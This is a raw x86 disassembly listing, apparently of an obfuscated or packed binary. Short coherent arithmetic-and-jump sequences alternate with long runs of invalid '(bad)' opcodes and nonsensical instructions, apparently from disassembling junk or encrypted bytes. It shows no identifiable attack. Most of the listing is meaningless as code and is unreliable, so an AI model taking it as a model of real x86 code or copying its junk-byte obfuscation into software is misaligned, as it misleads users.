  407cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0x35497a99]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407c98
  407ce1:	inc    ebp
  407ce2:	(bad)  
  407ce3:	mul    DWORD PTR [ecx+edx*2+0x3e2937af]
  407cea:	lods   eax,DWORD PTR ds:[esi]
  407ceb:	inc    esp
  407cec:	mov    al,BYTE PTR [edi-0x68]
  407cef:	add    al,0xea
  407cf1:	push   ebx
  407cf2:	pop    es
  407cf3:	daa    
  407cf4:	and    ch,BYTE PTR [ecx]
  407cf6:	mov    dh,0x35
  407cf8:	inc    ebx
  407cf9:	sub    ebx,DWORD PTR [esi+0x3]
  407cfc:	scas   eax,DWORD PTR es:[edi]
  407cfd:	pop    esp
  407cfe:	cmp    BYTE PTR ds:0x3a40c01b,bh
  407d04:	dec    edi
  407d05:	push   cs
  407d06:	pop    edx
  407d07:	or     ebx,eax
  407d09:	sub    BYTE PTR [ebp-0x12b3ff17],dh
  407d0f:	dec    ebp
  407d10:	aad    0x61
  407d12:	xchg   BYTE PTR [ebp+0x699c18e3],bl
  407d18:	and    edx,esp
  407d1a:	add    eax,0xd186c66f
  407d1f:	pushf  
  407d20:	je     0x407d26
  407d22:	nop
  407d23:	mov    edx,0x5a4f306f
  407d28:	fs adc al,0xb1
  407d2b:	ins    DWORD PTR es:[edi],dx
  407d2c:	pushf  
  407d2d:	jno    0x407d07
  407d2f:	add    BYTE PTR [eax+0x27],0x98
  407d33:	retf   
  407d34:	or     BYTE PTR [esp+esi*1],ch
  407d37:	push   eax
  407d38:	pop    es
  407d39:	retf   0x281e
  407d3c:	enter  0xcc32,0x13
  407d40:	xchg   esp,eax
  407d41:	push   ds
  407d42:	in     al,0x47
  407d44:	adc    DWORD PTR [ecx+0x4d35ad39],ecx
  407d4a:	bound  esp,QWORD PTR [edi-0x2bae3b0f]
  407d50:	mov    esp,0x6abda62c
  407d55:	retf   
  407d56:	jg     0x407d59
  407d58:	mov    edi,ss
  407d5a:	mov    esi,0xef135594
  407d5f:	xchg   edx,eax
  407d60:	dec    ebx
  407d61:	es inc ebp
  407d63:	dec    eax
  407d64:	mov    cl,0xab
  407d66:	out    dx,al
  407d67:	hlt    
  407d68:	jg     0x407d2a
  407d6a:	cmp    BYTE PTR [ebp+edx*2-0x1a52f856],al
  407d71:	stc    
  407d72:	mov    BYTE PTR [edi],ah
  407d74:	(bad)  
  407d76:	cmc    
  407d77:	(bad)  
  407d78:	in     eax,dx
  407d79:	mov    ebx,0xdcc8f0d
  407d7e:	fbstp  TBYTE PTR [esi-0x67c81cee]
  407d84:	xor    BYTE PTR [edi+ecx*1],cl
  407d87:	mov    WORD PTR [ebp+0x60f7f2bb],ss
  407d8d:	fbstp  TBYTE PTR [ebx-0x51]
  407d90:	ss fnsetpm(287 only) 
  407d93:	dec    eax
  407d94:	mov    dh,0xc5
  407d96:	pop    ebx
  407d97:	ret    
  407d98:	je     0x407d79
  407d9a:	gs fucomi st,st(2)
  407d9d:	popf   
  407d9e:	push   0xfecceecf
  407da3:	loope  0x407dfd
  407da5:	pop    esi
  407da6:	test   BYTE PTR [esi+eax*4+0x28],bh
  407daa:	push   eax
  407dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dac:	mov    ebp,0xd5e2ed77
  407db1:	cmp    ebp,ebx
  407db3:	aam    0x22
  407db5:	cmc    
  407db6:	cdq    
  407db7:	push   ecx
  407db8:	and    eax,DWORD PTR [eax]
  407dba:	mov    DWORD PTR [eax*2+0x73511475],ebx
  407dc1:	rol    BYTE PTR [ebp+0x72],0x24
  407dc5:	and    al,0xad
  407dc7:	out    0x9,al
  407dc9:	leave  
  407dca:	inc    edx
  407dcb:	shl    DWORD PTR [esi],1
  407dcd:	bswap  ecx
  407dcf:	and    al,0x1a
  407dd1:	adc    edx,DWORD PTR [esi-0x17]
  407dd4:	pop    edi
  407dd5:	pop    es
  407dd6:	pop    ecx
  407dd7:	xchg   ebp,eax
  407dd8:	out    0xf3,eax
  407dda:	inc    DWORD PTR [edx-0x53]
  407ddd:	enter  0xe193,0x9a
  407de1:	jg     0x407e22
  407de3:	nop
  407de4:	imul   ebp,DWORD PTR [edx-0x4767d9d4],0x5a
  407deb:	push   ebp
  407dec:	inc    esp
  407ded:	jecxz  0x407e36
  407def:	test   DWORD PTR [ecx],esi
  407df1:	adc    edx,ebp
  407df3:	xor    ebx,eax
  407df5:	sbb    DWORD PTR [esi-0x63cb6857],ecx
  407dfb:	mov    esp,0xdce50097
  407e00:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  407e02:	mov    bl,0x11
  407e04:	xchg   DWORD PTR [esi+0x6b7d4e2d],esi
  407e0a:	and    eax,0x1270bb86
  407e0f:	mov    al,0x76
  407e11:	add    BYTE PTR [edx],ah
  407e13:	push   esp
  407e14:	stc    
  407e15:	dec    ebx
  407e16:	adc    BYTE PTR [ecx-0x27],cl
  407e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e1a:	jne    0x407e75
  407e1c:	fcom   st(4)
  407e1e:	rcl    BYTE PTR [ecx-0x7e],0x19
  407e22:	sbb    edi,eax
  407e24:	jb     0x407dd5
  407e26:	add    eax,0xb32516a2
  407e2b:	mov    ds:0x396ade17,al
  407e30:	(bad)  
  407e31:	in     eax,dx
  407e32:	mov    edi,0x3a20ffa2
  407e37:	xchg   BYTE PTR [eax-0x5d],dl
  407e3a:	pop    edi
  407e3b:	mov    bh,0x7e
  407e3d:	push   es
  407e3e:	xchg   ebp,eax
  407e3f:	add    ebx,ebx
  407e41:	outs   dx,BYTE PTR ds:[esi]
  407e42:	dec    eax
  407e43:	jl     0x407e60
  407e45:	dec    edi
  407e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e47:	cmp    ebx,ebx
  407e49:	and    eax,0x3eecb579
  407e4e:	push   ds
  407e4f:	jmp    0x31fd:0x2fd34d8e
  407e56:	dec    ecx
  407e57:	popa   
  407e58:	jle    0x407e9a
  407e5a:	inc    eax
  407e5b:	push   ebp
  407e5c:	cld    
  407e5d:	in     al,dx
  407e5e:	popf   
  407e5f:	leave  
  407e60:	push   eax
  407e61:	mov    BYTE PTR [eax-0x5b],dh
  407e64:	fiadd  DWORD PTR [ecx-0x41]
  407e67:	jmp    0x407ea8
  407e69:	in     eax,0xa8
  407e6b:	aas    
  407e6c:	stos   BYTE PTR es:[edi],al
  407e6d:	or     eax,0x597a535b
  407e72:	std    
  407e73:	xchg   ebx,eax
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	leave  
  407e9e:	fsub   st,st(5)
  407ea0:	adc    BYTE PTR [ecx],0xcd
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407f28
  407eaa:	sbb    eax,0x8b1a566a
  407eaf:	add    BYTE PTR [edi+0x444f55be],cl
  407eb5:	push   edi
  407eb6:	or     al,0x3c
  407eb8:	push   ebp
  407eb9:	xchg   BYTE PTR [ebp-0xe92941d],al
  407ebf:	in     al,0x6c
  407ec1:	faddp  st(2),st
  407ec3:	or     ch,BYTE PTR [ebx-0x58ab402e]
  407ec9:	iret   
  407eca:	rcl    BYTE PTR [esi+0x4425760b],cl
  407ed0:	pusha  
  407ed1:	imul   esi,DWORD PTR ds:0xa0890b13,0x24
  407ed8:	leave  
  407ed9:	test   BYTE PTR [ecx+0x3eb8b253],dh
  407edf:	call   FWORD PTR [ecx]
  407ee1:	jb     0x407e91
  407ee3:	icebp  
  407ee4:	inc    eax
  407ee5:	xor    dh,BYTE PTR [edx+0x67]
  407ee8:	dec    ebp
  407ee9:	and    al,0x9f
  407eeb:	pop    ds
  407eec:	pop    es
  407eed:	jmp    0x407eba
  407eef:	adc    BYTE PTR [eax+0x1a5bfc4],bl
  407ef5:	push   edx
  407ef6:	inc    ecx
  407ef7:	in     eax,dx
  407ef8:	imul   esi,ebx,0x47
  407efb:	xchg   edi,eax
  407efc:	cdq    
  407efd:	mov    ch,0xa1
  407eff:	in     eax,dx
  407f00:	aad    0x87
  407f02:	and    eax,0x8e64ad73
  407f07:	(bad)  
  407f08:	jmp    0x674e:0x51e8a12
  407f0f:	iret   
  407f10:	sti    
  407f11:	mov    DWORD PTR [eax+0x29b5e2b1],ebp
  407f17:	and    DWORD PTR [edi],ebx
  407f19:	inc    ebp
  407f1a:	pop    esi
  407f1b:	inc    eax
  407f1c:	popa   
  407f1d:	loopne 0x407eda
  407f1f:	adc    al,0x91
  407f21:	(bad)  
  407f23:	lea    cx,ds:0x96542150
  407f2a:	sbb    eax,DWORD PTR [ebp-0x2e]
  407f2d:	stc    
  407f2e:	push   edx
  407f2f:	out    dx,eax
  407f30:	mov    al,0xa4
  407f32:	test   eax,0x77e53d1f
  407f37:	adc    DWORD PTR [ecx-0x13],edi
  407f3a:	cmp    bh,BYTE PTR [eax+0x8]
  407f3d:	cmp    al,0x6d
  407f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f40:	les    eax,FWORD PTR [esi-0x5eb8a2d1]
  407f46:	out    0x96,eax
  407f48:	ins    BYTE PTR es:[edi],dx
  407f49:	call   0xaf140987
  407f4e:	addr16 jp 0x407fbf
  407f51:	in     al,dx
  407f52:	push   0x9693d381
  407f57:	push   edx
  407f58:	mov    dh,0x2
  407f5a:	adc    cl,BYTE PTR [edi+0x1eaa87d9]
  407f60:	jecxz  0x407f7f
  407f62:	jne    0x407f69
  407f64:	xchg   edi,eax
  407f65:	mov    dh,0x9
  407f67:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f69:	fild   QWORD PTR [ebp+0x3d]
  407f6c:	xor    ebx,ebx
  407f6e:	jo     0x407f75
  407f70:	repnz imul edx,ebp,0xffffffb1
  407f74:	sub    al,0x86
  407f76:	aam    0xdc
  407f78:	test   BYTE PTR [edi-0x7461bfa8],bh
  407f7e:	cmp    DWORD PTR [edx+0x32],ebx
  407f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f82:	or     al,0x43
  407f84:	stos   DWORD PTR es:[edi],eax
  407f85:	pop    es
  407f86:	inc    edx
  407f87:	add    ch,BYTE PTR [ebp+0x3f732ac8]
  407f8d:	inc    ecx
  407f8e:	rcr    ah,1
  407f90:	mov    ebx,0xef163fc9
  407f95:	scas   al,BYTE PTR es:[edi]
  407f96:	inc    ecx
  407f97:	jnp    0x407f28
  407f99:	sub    BYTE PTR [esi+esi*1+0x7365e135],al
  407fa0:	fwait
  407fa1:	xchg   edi,eax
  407fa2:	xchg   ebx,eax
  407fa3:	adc    BYTE PTR [ebx+0xc],dl
  407fa6:	add    edi,DWORD PTR [esi-0x144a835c]
  407fac:	je     0x407f94
  407fae:	das    
  407faf:	pop    es
  407fb0:	xor    al,0x6
  407fb2:	sahf   
  407fb3:	retf   0x8ebd
  407fb6:	xchg   DWORD PTR [edi-0x3eae6dc4],edx
  407fbc:	sbb    eax,0xb34018dd
  407fc1:	sub    esi,edx
  407fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fc4:	xor    BYTE PTR [eax],ah
  407fc6:	xor    ebp,DWORD PTR ds:0x9b1b824d
  407fcc:	mov    ebx,ebx
  407fce:	or     BYTE PTR [edi+0x7ff985d4],cl
  407fd4:	mov    bl,BYTE PTR [ebx+0x70438699]
  407fda:	mov    al,ds:0x4972c504
  407fdf:	pop    esi
  407fe0:	stos   DWORD PTR es:[edi],eax
  407fe1:	das    
  407fe2:	or     DWORD PTR [edx+0x1f47b79d],eax
  407fe8:	cmp    eax,0x7f03446a
  407fed:	arpl   WORD PTR [ecx+ebx*8+0x6f],cx
  407ff1:	daa    
  407ff2:	leave  
  407ff3:	outs   dx,DWORD PTR ds:[esi]
  407ff4:	icebp  
  407ff5:	xchg   BYTE PTR ds:0x95e854e3,dl
  407ffb:	push   0xfffffffc
  407ffd:	push   edx
  407ffe:	aam    0x63
  408000:	pop    edx
  408001:	or     esp,DWORD PTR [esi+ecx*2+0x5936d6d5]
  408008:	mov    esi,gs
  40800a:	push   ebx
  40800b:	push   esp
  40800c:	sub    BYTE PTR [ecx+eax*8],dl
  40800f:	jge    0x408057
  408011:	iret   
  408012:	push   edx
  408013:	imul   esi,DWORD PTR [edx],0x6f3d0376
  408019:	xor    eax,0x28b60e43
  40801e:	inc    esi
  40801f:	daa    
  408020:	rcr    bh,0xcc
  408023:	xor    al,BYTE PTR [ecx+ecx*8+0x5e870e02]
  40802a:	xor    edx,edi
  40802c:	call   0x619e1825
  408031:	add    al,0x44
  408033:	loopne 0x408059
  408035:	jno    0x40807f
  408037:	adc    eax,0x13e8781a
  40803c:	xchg   ebp,eax
  40803d:	add    edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	sub    BYTE PTR [eax-0x12],bl
  40807c:	stc    
  40807d:	lods   eax,DWORD PTR ds:[esi]
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x40807b
  408086:	and    al,BYTE PTR [edx+eiz*1-0x56]
  40808a:	lods   eax,DWORD PTR ds:[esi]
  40808b:	std    
  40808c:	mov    dx,0x2de5
  408090:	pop    ss
  408091:	dec    ebp
  408092:	mov    cl,BYTE PTR [ebx+ebx*2+0x37]
  408096:	gs jnp 0x4080dd
  408099:	clc    
  40809a:	jnp    0x408112
  40809c:	enter  0xfacc,0x88
  4080a0:	dec    ebx
  4080a1:	out    dx,eax
  4080a2:	push   0x9528e19b
  4080a7:	xor    esp,DWORD PTR [ebp-0x54]
  4080aa:	push   0xffffffb6
  4080ac:	mov    BYTE PTR [edx-0x3e0a5e7a],dh
  4080b2:	out    dx,eax
  4080b3:	cwde   
  4080b4:	fisubr WORD PTR [edi+0x4]
  4080b7:	and    eax,0x268183e1
  4080bc:	mov    esp,0xf13b065e
  4080c1:	out    dx,eax
  4080c2:	or     ch,dh
  4080c4:	mov    cl,dh
  4080c6:	scas   al,BYTE PTR es:[edi]
  4080c7:	lea    ebx,[ebx+0x4b]
  4080ca:	jnp    0x4080fe
  4080cc:	rcl    DWORD PTR [ecx],1
  4080ce:	mov    cl,0x4e
  4080d0:	adc    al,0xf9
  4080d2:	in     al,dx
  4080d3:	bound  eax,QWORD PTR [edx-0x6c]
  4080d6:	in     al,dx
  4080d7:	cwde   
  4080d8:	sti    
  4080d9:	test   al,0x4a
  4080db:	xlat   BYTE PTR ds:[ebx]
  4080dc:	nop
  4080dd:	sbb    al,0x6f
  4080df:	shr    DWORD PTR [ebx-0x12],0xfb
  4080e3:	ror    bl,cl
  4080e5:	rcr    BYTE PTR [esi],1
  4080e7:	pop    ecx
  4080e8:	js     0x408127
  4080ea:	in     al,dx
  4080eb:	mov    eax,0x15e8c5e6
  4080f0:	mov    BYTE PTR [ebp+0x3225a656],al
  4080f6:	pop    ebp
  4080f7:	jecxz  0x408131
  4080f9:	xchg   esi,eax
  4080fa:	pop    edx
  4080fb:	out    dx,eax
  4080fc:	cdq    
  4080fd:	inc    edi
  4080fe:	mov    WORD PTR [ecx+0x7bf0a65],es
  408104:	out    0x98,al
  408106:	cwde   
  408107:	test   al,0xf
  408109:	lods   al,BYTE PTR ds:[esi]
  40810a:	push   edi
  40810b:	imul   esp,esp,0xe8848f9f
  408111:	cli    
  408112:	or     ebp,ebx
  408114:	mov    eax,0xb11ddd07
  408119:	cmovno esi,DWORD PTR [ecx]
  40811c:	fist   WORD PTR [edi+0x44]
  40811f:	xchg   ecx,eax
  408120:	fidiv  DWORD PTR [esi]
  408122:	push   esp
  408123:	pop    edx
  408124:	int3   
  408125:	and    al,0x77
  408127:	out    dx,eax
  408128:	lahf   
  408129:	dec    edx
  40812a:	sub    dh,BYTE PTR [esi-0x69b3e69f]
  408130:	(bad)  
  408131:	aaa    
  408132:	retf   
  408133:	inc    eax
  408134:	xchg   ebx,eax
  408135:	mov    ah,0xab
  408137:	call   0x3b72ea5f
  40813c:	dec    ebx
  40813d:	lods   eax,DWORD PTR gs:[esi]
  40813f:	fsubr  QWORD PTR ds:0x8f90dce3
  408145:	rcr    ch,1
  408147:	inc    esp
  408148:	xchg   esi,eax
  408149:	sub    al,0x4b
  40814b:	in     eax,dx
  40814c:	push   ecx
  40814d:	sbb    BYTE PTR ds:0xdc5745ad,ah
  408153:	ret    0x365f
  408156:	shl    DWORD PTR [eax+edx*2],0x55
  40815a:	fdiv   st,st(7)
  40815c:	es pop ecx
  40815e:	test   DWORD PTR [edi+eax*8-0x31],eax
  408162:	stos   BYTE PTR es:[edi],al
  408163:	aad    0xd6
  408165:	jae    0x4081aa
  408167:	icebp  
  408168:	mov    ch,0x6
  40816a:	adc    DWORD PTR [ecx+edx*8],0xffffffc7
  40816e:	mov    bh,BYTE PTR [ecx]
  408170:	jmp    0x4081a3
  408172:	pop    ebx
  408173:	xor    BYTE PTR ds:0x88414b51,bh
  408179:	and    edi,edi
  40817b:	rcl    BYTE PTR [esi+0x6b],cl
  40817e:	or     edx,edx
  408180:	outs   dx,DWORD PTR ds:[esi]
  408181:	sbb    ch,BYTE PTR [ecx-0x13d850d9]
  408187:	daa    
  408188:	call   0x2f6d3074
  40818d:	jb     0x4081c2
  40818f:	sbb    eax,0xeec449af
  408194:	lods   al,BYTE PTR ds:[esi]
  408195:	fbld   TBYTE PTR [eax+esi*4]
  408198:	mov    WORD PTR [ecx+0x70],cs
  40819b:	in     eax,dx
  40819c:	jp     0x4081b2
  40819e:	mul    DWORD PTR [edi+0x7bf85eec]
  4081a4:	(bad)  
  4081a5:	jmp    0x40812b
  4081a7:	dec    edi
  4081a8:	aaa    
  4081a9:	dec    edi
  4081aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ab:	pop    edi
  4081ac:	scas   al,BYTE PTR es:[edi]
  4081ad:	mov    edi,0xc97564b8
  4081b2:	push   0xc8a151b1
  4081b7:	add    BYTE PTR [esi+0x394692bf],bl
  4081bd:	sbb    dl,al
  4081bf:	les    ecx,FWORD PTR [ebx-0x5b93e16b]
  4081c5:	aas    
  4081c6:	inc    esp
  4081c7:	jno    0x4081e3
  4081c9:	xchg   DWORD PTR [ebx+0x5217106e],ecx
  4081cf:	jmp    DWORD PTR [esi-0x3aac8db8]
  4081d5:	scas   al,BYTE PTR es:[edi]
  4081d6:	lock or bh,BYTE PTR [ebx-0x6859b136]
  4081dd:	test   DWORD PTR [edi-0x6f],ecx
  4081e0:	imul   edi,DWORD PTR [ecx+0x7ed20180],0xffffff8b
  4081e7:	push   ebx
  4081e8:	cmp    BYTE PTR [ebp+0x59],cl
  4081eb:	pop    esp
  4081ec:	xor    BYTE PTR [edx+0x24179efe],ch
  4081f2:	(bad)
  4081f5:	mov    eax,0x47188742
  4081fa:	jo     0x40821f
  4081fc:	sub    eax,0xf477ef5e
  408201:	enter  0x47fd,0x28
  408205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408206:	aas    
  408207:	push   cs
  408208:	dec    ecx
  408209:	mov    edx,eax
  40820b:	shl    bl,0xef
  40820e:	jb     0x408207
  408210:	rcl    DWORD PTR [edi],0x71
  408213:	ins    BYTE PTR es:[edi],dx
  408214:	sbb    DWORD PTR [ecx],ebp
  408216:	jmp    0xd143f3f5
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3967:0x8ac72662
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x40825f
  408239:	call   0x2403050b
  40823e:	fwait
  40823f:	jmp    0x760df2a1
  408244:	in     eax,0x5a
  408246:	inc    ebp
  408247:	loopne 0x408250
  408249:	arpl   WORD PTR [esi],dx
  40824b:	xor    DWORD PTR [eax],0xa38dbf44
  408251:	inc    edx
  408252:	pop    esp
  408253:	push   cs
  408254:	xor    eax,0x87bd0428
  408259:	loop   0x408285
  40825b:	mov    ch,0xf
  40825d:	je     0x4081e6
  40825f:	mov    cl,0x59
  408261:	push   esp
  408262:	in     al,dx
  408263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408264:	sub    al,0x82
  408266:	inc    ecx
  408267:	in     eax,0x11
  408269:	loope  0x40825e
  40826b:	cmp    DWORD PTR [edx],0xd041bcfe
  408271:	dec    esi
  408272:	scas   al,BYTE PTR es:[edi]
  408273:	daa    
  408274:	and    ch,bh
  408276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408277:	xchg   ebx,eax
  408278:	xor    cl,dh
  40827a:	loope  0x4082ba
  40827c:	(bad)  
  40827d:	enter  0x42f,0x23
  408281:	in     al,0xae
  408283:	xor    ecx,DWORD PTR [eax-0x4]
  408286:	enter  0x969f,0x51
  40828a:	or     eax,0x7411990d
  40828f:	cmp    al,BYTE PTR [edi+0x71699237]
  408295:	mov    edi,0xa3f0647c
  40829a:	ss xchg edx,eax
  40829c:	and    bh,dh
  40829e:	mov    eax,0xf4a3effe
  4082a3:	cmp    al,0xc7
  4082a5:	mov    ah,BYTE PTR [edi+0x1318b218]
  4082ab:	jo     0x408263
  4082ad:	inc    edi
  4082ae:	jge    0x408310
  4082b0:	lds    ecx,FWORD PTR [esi]
  4082b2:	inc    esp
  4082b3:	add    DWORD PTR [edi+0x5ce11001],eax
  4082b9:	cli    
  4082ba:	mov    esp,0x35ba1654
  4082bf:	push   cs
  4082c0:	and    ecx,DWORD PTR [edx+0x44]
  4082c3:	jbe    0x4082d7
  4082c5:	pop    eax
  4082c6:	daa    
  4082c7:	aas    
  4082c8:	push   0x65
  4082ca:	pop    esp
  4082cb:	loop   0x40833a
  4082cd:	cwde   
  4082ce:	pop    ds
  4082cf:	fisttp QWORD PTR [ebp+0x5e295e50]
  4082d5:	hlt    
  4082d6:	retf   
  4082d7:	jnp    0x408333
  4082d9:	sbb    al,0xf4
  4082db:	clc    
  4082dc:	mov    esp,0x3cd77eb7
  4082e1:	daa    
  4082e2:	and    BYTE PTR [eax-0x1c],bl
  4082e5:	mov    ?,WORD PTR [ebp-0x26048184]
  4082eb:	sbb    BYTE PTR [eax],al
  4082ed:	ror    ecx,cl
  4082ef:	jle    0x4082f8
  4082f1:	dec    esp
  4082f2:	aas    
  4082f3:	xlat   BYTE PTR ds:[ebx]
  4082f4:	dec    ebp
  4082f5:	into   
  4082f6:	(bad)  
  4082f7:	daa    
  4082f8:	es push esp
  4082fa:	inc    ebp
  4082fb:	mov    esi,0x7d698f24
  408300:	add    eax,0x47cf7f0d
  408305:	mov    ecx,0x5765bff3
  40830a:	bound  ecx,QWORD PTR [edi+eiz*2]
  40830d:	and    BYTE PTR [eax],bl
  40830f:	adc    DWORD PTR [esi],0xffffff80
  408312:	cmc    
  408313:	and    edx,DWORD PTR [ebx]
  408315:	ja     0x40834c
  408317:	out    dx,al
  408318:	test   BYTE PTR [edi+ebx*2+0x69a81b67],dl
  40831f:	add    eax,0x4e7077ac
  408324:	pushf  
  408325:	xchg   edi,eax
  408326:	inc    ecx
  408327:	leave  
  408328:	call   0x7993a0c9
  40832d:	sub    eax,0x75618cfd
  408332:	inc    ebp
  408333:	imul   ebx,DWORD PTR [ebp-0x5d93cd19],0x44bdb461
  40833d:	pop    ebx
  40833e:	jae    0x4082c9
  408340:	mov    eax,DWORD PTR [edi+esi*1-0x20d20d4c]
  408347:	fistp  QWORD PTR [ecx+0x6c]
  40834a:	ins    DWORD PTR es:[edi],dx
  40834b:	cld    
  40834c:	mov    ah,0x60
  40834e:	in     eax,0x3
  408350:	test   ecx,eax
  408352:	sahf   
  408353:	mov    ecx,0x34ea318f
  408358:	sub    eax,0x14bf1488
  40835d:	shl    DWORD PTR [edi],cl
  40835f:	mov    eax,ds:0x62cb8cb9
  408364:	clc    
  408365:	repz test al,0x88
  408368:	test   eax,0xa7008643
  40836d:	stos   BYTE PTR es:[edi],al
  40836e:	mov    DWORD PTR [edx-0x74ae5347],0x3d976833
  408378:	sbb    al,0xa8
  40837a:	ror    BYTE PTR [eax+0xb],cl
  40837d:	out    dx,al
  40837e:	cmp    BYTE PTR ds:[esi+0x3e7473aa],0x79
  408386:	bound  eax,QWORD PTR [edi]
  408388:	xor    BYTE PTR [eax+0x4],ah
  40838b:	std    
  40838c:	fisttp WORD PTR [eax+0x49]
  40838f:	popa   
  408390:	dec    ecx
  408391:	pop    ss
  408392:	or     DWORD PTR [ecx-0x1e2e8098],eax
  408398:	mov    bh,0x40
  40839a:	rcr    DWORD PTR [edx-0x7aaebdb1],0x8f
  4083a1:	push   esp
  4083a2:	inc    ebp
  4083a3:	mov    al,0x47
  4083a5:	loop   0x408389
  4083a7:	mov    ds:0x82ef3fc7,eax
  4083ac:	(bad)  
  4083ad:	fcom   DWORD PTR ds:0xac3f487a
  4083b3:	loope  0x408391
  4083b5:	in     eax,dx
  4083b6:	jp     0x40840d
  4083b8:	pop    es
  4083b9:	call   0x811f:0x88f8cb9f
  4083c0:	sub    BYTE PTR [esi-0x4c86c0a5],dl
  4083c6:	es inc ebx
  4083c8:	loopne 0x40839e
  4083ca:	jp     0x408392
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	jle    0x408460
  4083ea:	(bad)  
  4083eb:	sbb    eax,0x7e7ec955
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408383
  4083f5:	cmovg  ebx,DWORD PTR [ecx]
  4083f8:	add    BYTE PTR [esi],dl
  4083fa:	or     al,0xbc
  4083fc:	mov    esp,0x93988479
  408401:	add    al,BYTE PTR [edi]
  408403:	inc    edx
  408404:	sub    dh,BYTE PTR [eax+0x5b06e5e5]
  40840a:	pop    edi
  40840b:	jo     0x4083e9
  40840d:	stos   BYTE PTR es:[edi],al
  40840e:	and    BYTE PTR [edx],dl
  408410:	and    DWORD PTR [ebx-0x7c],edi
  408413:	dec    esp
  408414:	mov    ds:0xd18582a4,eax
  408419:	repz xchg dh,al
  40841c:	ficom  WORD PTR [ecx-0x70]
  40841f:	sub    esp,DWORD PTR [edi]
  408421:	mov    ecx,0x7c9c7d35
  408426:	adc    ecx,esp
  408428:	ret    0x22c
  40842b:	nop
  40842c:	loopne 0x408405
  40842e:	loope  0x40840e
  408430:	std    
  408431:	sub    al,0x1
  408433:	fs adc bl,cl
  408436:	ins    DWORD PTR es:[edi],dx
  408437:	jp     0x40843d
  408439:	sbb    eax,edi
  40843b:	cmp    edi,DWORD PTR [esi+0x5329f6c0]
  408441:	sti    
  408442:	jno    0x40845d
  408444:	dec    edi
  408445:	pop    es
  408446:	in     al,dx
  408447:	es ss push edx
  40844a:	into   
  40844b:	mov    dh,0xf5
  40844d:	mov    ecx,0x33913a2
  408452:	jne    0x408476
  408454:	xor    ah,BYTE PTR [ebp+0x3d0b22cf]
  40845a:	(bad)  
  40845b:	xlat   BYTE PTR ds:[ebx]
  40845c:	xor    al,dh
  40845e:	and    eax,0x984712e7
  408463:	mov    esi,0x728b92d4
  408468:	sahf   
  408469:	rol    dl,0x98
  40846c:	mov    gs:0xe18110e2,al
  408472:	sahf   
  408473:	cmc    
  408474:	mov    BYTE PTR [ebx+edi*1],bh
  408477:	pop    edi
  408478:	(bad)  
  408479:	pop    ebx
  40847a:	fcmove st,st(3)
  40847c:	leave  
  40847d:	mov    bl,BYTE PTR [ebx-0xb56f6bb]
  408483:	popa   
  408484:	gs imul ebp,eax,0x181be4ce
  40848b:	sbb    eax,0x40a16e08
  408490:	psllw  mm7,QWORD PTR [ecx+ebp*2]
